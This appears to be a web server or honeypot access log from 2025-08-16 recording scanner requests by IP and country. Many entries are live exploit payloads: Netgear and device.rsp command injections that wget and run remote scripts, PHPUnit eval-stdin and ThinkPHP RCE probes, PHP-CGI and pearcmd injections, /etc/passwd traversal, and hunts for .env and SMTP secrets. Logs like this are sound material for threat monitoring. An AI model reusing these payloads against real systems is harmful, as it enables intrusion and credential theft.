"2025-08-16","45.82.78.113","Germany","HTTP","/favicon.ico"
"2025-08-16","171.234.9.203","Vietnam","HTTP","/tmUnblock.cgi"
"2025-08-16","141.98.10.21","Lithuania","HTTP","/setup.cgi?next_file=netgear.cfg\u0026todo=syscmd\u0026cmd=cd+/tmp;rm+-rf+*;wget+http://66.63.187.141/netg;chmod+777+netg;sh+netg+netgear;\u0026curpath=/\u0026currentsetting.htm=1;"
"2025-08-16","79.124.58.198","Bulgaria","HTTP","/?XDEBUG_SESSION_START=phpstorm"
"2025-08-16","113.57.20.40","China","HTTP","/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
"2025-08-16","113.57.20.40","China","HTTP","/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
"2025-08-16","113.57.20.40","China","HTTP","/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/vendor/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/vendor/phpunit/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/vendor/phpunit/phpunit/LICENSE/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/phpunit/phpunit/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/phpunit/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/lib/phpunit/phpunit/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/lib/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/lib/phpunit/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-08-16","113.57.20.40","China","HTTP","/index.php?s=/index/\\think\\app/invokefunction\u0026function=call_user_func_array\u0026vars[0]=md5\u0026vars[1][]=Hello"
"2025-08-16","113.57.20.40","China","HTTP","/public/index.php?s=/index/\\think\\app/invokefunction\u0026function=call_user_func_array\u0026vars[0]=md5\u0026vars[1][]=Hello"
"2025-08-16","113.57.20.40","China","HTTP","/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd\u0026+config-create+/\u0026/\u003c?echo(md5(\"hi\"));?\u003e+/tmp/index1.php"
"2025-08-16","113.57.20.40","China","HTTP","/index.php?lang=../../../../../../../../tmp/index1"
"2025-08-16","113.57.20.40","China","HTTP","/containers/json"
"2025-08-16","79.124.58.198","Bulgaria","HTTP","/actuator/gateway/routes"
"2025-08-16","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-08-16","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-08-16","185.248.59.152","Türkiye","HTTP","/manager/html"
"2025-08-16","195.184.76.243","United States","HTTP","/favicon.ico"
"2025-08-16","196.251.117.75","The Netherlands","HTTP","/.env"
"2025-08-16","195.96.129.82","The Netherlands","HTTP","/device.rsp?opt=sys\u0026cmd=___S_O_S_T_R_E_A_MAX___\u0026mdb=sos\u0026mdc=wget%20http%3A%2F%2F207.244.199.152%2Ftbk.sh%20-O-%20%7C%20sh"
"2025-08-16","110.255.158.179","China","HTTP","/HNAP1/"
"2025-08-16","185.177.72.12","France","HTTP","/.git/HEAD"
"2025-08-16","185.177.72.12","France","HTTP","/weblau/portal/visualizador/arquivos/laudo?id=../../../../../../../etc/passwd"
"2025-08-16","185.177.72.12","France","HTTP","/.env"
"2025-08-16","185.177.72.12","France","HTTP","/.git/config"
"2025-08-16","185.177.72.12","France","HTTP","/smtp/.env"
"2025-08-16","185.177.72.12","France","HTTP","/smtp/hidden-keys.json"
"2025-08-16","185.177.72.12","France","HTTP","/smtp/.backup/smtp.env"
"2025-08-16","185.177.72.12","France","HTTP","/sendgrid/.private/smtp.env"
"2025-08-16","185.177.72.12","France","HTTP","/mail/.smtp/secrets.json"
"2025-08-16","185.177.72.12","France","HTTP","/backend/.smtp-config.json"
"2025-08-16","185.177.72.12","France","HTTP","/config/smtp/.keys.env"
"2025-08-16","185.177.72.12","France","HTTP","/smtp/internal/secrets.env"
